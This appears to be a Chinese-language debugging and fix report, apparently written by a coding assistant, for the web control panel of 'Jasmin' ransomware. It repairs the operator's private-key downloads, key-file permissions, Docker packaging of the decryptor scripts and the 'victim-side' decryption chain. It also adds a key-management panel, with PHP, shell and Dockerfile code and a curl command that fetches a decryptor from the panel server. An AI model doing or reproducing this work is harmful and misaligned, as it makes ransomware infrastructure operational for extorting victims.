## 一、根因分析

### 1.1 直接原因：一个自相矛盾的设计

`keygen.php` 生成密钥时把明文私钥写到 `Web Panel/payloads/jasmin_private.pem`，并在代码注释里写明"保护明文私钥不可直接URL访问"，同时 `.htaccess` 也显式拒绝它：

```apache
# Block plaintext private key and secret (only .pem.enc is public)
<FilesMatch "^\.key_secret$|^jasmin_private\.pem$">
    Order allow,deny
    Deny from all
</FilesMatch>
```

但 `dashboard.php` 又给了用户一个**直链**去下载这个文件：

```html
<a href="payloads/jasmin_private.pem" download>下载私钥</a>
```

→ 浏览器发起 `GET /payloads/jasmin_private.pem` → Apache `.htaccess` 命中 `FilesMatch` → **403 Forbidden** → 前端显示「下载失败」。

而当时唯一的鉴权下载接口 `download_file.php` 又只放行 `passwords/`：

```php
$base_dir = realpath(__DIR__ . '/passwords');
if ($real_path === false || strpos($real_path, $base_dir) !== 0) {
    http_response_code(403);   // payloads/ 下的密钥同样被拒
```

两道路都被堵死。

### 1.2 隐藏原因：权限

即便路由修好，仍然会失败 —— 密钥文件的属主是 `root:root`：

```
-rw-------. 1 root root  32 Oct  1 02:20 .key_secret
-rw-------. 1 root root 1675 Oct  1 02:20 jasmin_private.pem
```

而 Apache worker 进程是 `www-data`（`ps aux` 确认）。`keygen.php` 原先写：

```php
chmod($dir . '/jasmin_private.pem', 0600);   // root:root 0600 → www-data 读不到
chmod($dir . '/.key_secret', 0600);
```

`download_file.php` 的 `readfile()` 会因权限不足失败。属主之所以是 root，是因为密钥曾由 entrypoint 里的 `php setup.php`（以 root 运行）等 CLI 路径生成。

### 1.3 连带发现：解密链路其实是断的

排查密钥用途时发现，**取到私钥也没用**，因为：

**（a）`$aes_pwd` 恒为 `KEY_NOT_SET`**

```php
// decrypt_panel.html 原代码（__DIR__ 指向 includes/）
$ks_path = __DIR__ . '/payloads/.key_secret';
//          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
//  = Web Panel/includes/payloads/.key_secret  ← 这个路径永远不存在
$aes_pwd = file_exists($ks_path) ? trim(file_get_contents($ks_path)) : 'KEY_NOT_SET';
```

所有解密命令第一行都是 `K="KEY_NOT_SET"`，AES 必然解不开。

**（b）解密脚本根本没被打包进镜像**

`docker/Dockerfile.php` 只有：

```dockerfile
COPY ["Web Panel/", "/var/www/html/"]
```

而解密教程命令是：

```
curl -sL http://<srv>/payloads/jasmin_decrypt.py -o /tmp/.jd
```

`jasmin_decrypt.py` 与 `jasmin_decrypt_openssl.sh` 实际放在仓库的 `Linux Encrypter/` 目录，**从未被 COPY 进镜像**。容器内实测：

```
$ docker exec docker-php-1 ls /var/www/html/payloads/
jasmin_esxi_20261001_021715_6e5ce7a7.sh
jasmin_linux_20261001_011129_8344dd8d.py
jasmin_private.pem            ← 只有密钥，没有任何 decrypt 脚本
jasmin_private.pem.enc
jasmin_public.pem
...
```

→ 所有解密命令 404。

## 二、修复内容

### 2.1 下载接口白名单（`download_file.php` 重写）

```php
$file = str_replace('\\', '/', (string)($_GET['file'] ?? ''));
$root = realpath(__DIR__);
$real = realpath($root . '/' . $file);
if ($real === false || strpos($real, $root . '/') !== 0 || !is_file($real)) {
    http_response_code(404);   // realpath 归一化 ../，随后必须仍在根目录下
    exit;
}
$rel = substr($real, strlen($root) + 1);

$KEY_FILES = [
    'payloads/jasmin_private.pem.enc',
    'payloads/jasmin_private.pem',
    'payloads/jasmin_public.pem',
    'payloads/.key_secret',
];
$allowed = (strpos($rel, 'passwords/') === 0) || in_array($rel, $KEY_FILES, true);
if (!$allowed) { http_response_code(403); exit; }
```

`payloads/` 下**精确文件名白名单**，而不是整个目录 —— 否则生成的载荷脚本也会变成可下载目标。另加 `is_readable()` 明确报错与 `X-Content-Type-Options: nosniff`。

直链仍然保持 403（**没有**为了修 bug 而放开 `.htaccess`）。

### 2.2 密钥文件权限（`keygen.php`）

```php
foreach (['jasmin_private.pem.enc', 'jasmin_public.pem', 'jasmin_private.pem', '.key_secret'] as $f) {
    $p = $dir . '/' . $f;
    if (!file_exists($p)) continue;
    @chown($p, 'www-data');
    @chgrp($p, 'www-data');
    @chmod($p, 0640);
    if (!is_readable($p)) @chmod($p, 0644);   // 兜底：非 root 调用时 chown 会失败
}
```

配合 `docker/entrypoint-php.sh` 启动时修正历史文件：

```bash
chown -R www-data:www-data /var/www/html/payloads
for f in jasmin_private.pem jasmin_private.pem.enc jasmin_public.pem .key_secret; do
  [ -f "/var/www/html/payloads/$f" ] && chmod 0640 "/var/www/html/payloads/$f"
done
```

### 2.3 新增常驻「密钥管理」面板

原设计只在点「生成RSA密钥对」之后才出现下载按钮，刷新页面即消失。现改为常驻区块，显示密钥状态与公钥指纹，并给出 4 个下载入口（明文私钥 / AES 加密私钥 / 解密口令 / 公钥），全部走鉴权接口。

```
┌ ● 密钥已就绪  公钥指纹 SHA256: ebc67cad17675ca4… ────────────┐
│ [下载私钥 .pem明文] [下载私钥 AES加密] [下载解密口令] [下载公钥] │
│ 受害者端解密：用 .pem.enc + 解密口令 走加密链路；               │
│ 或直接用明文私钥 sh jasmin_decrypt_openssl.sh key.pem /        │
└──────────────────────────────────────────────────────────┘
```

### 2.4 解密链路打通

- `decrypt_panel.html`：`__DIR__` → `dirname(__DIR__)`
- `dashboard.php` 内联「一键解密」命令：`payloads/jasmin_private.pem` → `.pem.enc` + 内嵌口令的 AES-256-CBC 解密链路
- `Dockerfile.php` / `Dockerfile.python`：`COPY ["Linux Encrypter/", "/opt/jasmin-tools/"]`
- `entrypoint-php.sh` / `entrypoint-python.sh`：运行时把解密工具补进 `shared_payloads` 卷

> **为什么走 entrypoint 而不是直接 COPY 到 payloads/**：`payloads/` 是 Docker volume（`shared_payloads`），镜像里 `COPY` 进去的内容会被卷挂载覆盖。所以解密工具先烘焙到非卷路径 `/opt/jasmin-tools/`，运行时再补进卷内。

### 2.5 Python 端对齐

- 新增 `@login_required` 的 `/download_key` 路由（`os.path.basename` 防穿越 + 精确白名单 + `Response` 手动构造，避开 `send_file` 参数名跨版本差异）
- `/keygen` 的 `fetch` 补上 `csrf_token`
- 补密钥管理面板与 `has_key` / `key_fp` 模板变量
- keygen 权限 `0o600` → `0o644`

## 五、遗留

1. **Windows 的 `Jasmin_Decryptor.exe` 仓库未附编译产物**，解密教程里仍会 404。本机无 C# 编译器，无法产出。已在 UI 命令中加注「需先将 Jasmin_Decryptor.exe 放入 payloads/」。**替代方案**：Windows 端可装 Python 后直接用 `jasmin_decrypt_openssl.sh`（需 Git Bash/WSL）或 `jasmin_decrypt.py`，与 Linux/macOS 共用同一套工具。

2. **明文私钥落盘在 web 目录内**（`payloads/jasmin_private.pem`）。目前靠 `.htaccess` + 登录鉴权双保护，但更彻底的做法是密钥不落 web 根目录，仅在下载时即时从 `.pem.enc` 解密到内存输出。当前实现保留了落盘版本以兼容既有解密流程。

3. `.key_secret` 为 0640 且 owner 可能因 CLI 路径仍为 root —— `keygen.php` 已加兜底（读不到时放开到 0644），`entrypoint` 每次启动也会修正。
